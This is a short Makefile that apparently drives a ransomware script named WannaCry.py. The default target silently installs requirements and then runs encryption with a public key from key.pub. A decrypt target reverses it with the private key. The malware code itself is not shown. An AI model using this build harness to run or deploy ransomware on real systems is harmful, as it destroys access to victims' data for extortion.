all: install encrypt

install:
	@pip install -r requirements.txt > /dev/null 2>&1

encrypt:
	@python3 src/WannaCry.py "$$(sed -n '2p' key.pub)"

decrypt:
	@python3 src/WannaCry.py -r "$$(sed -n '2p' key)"
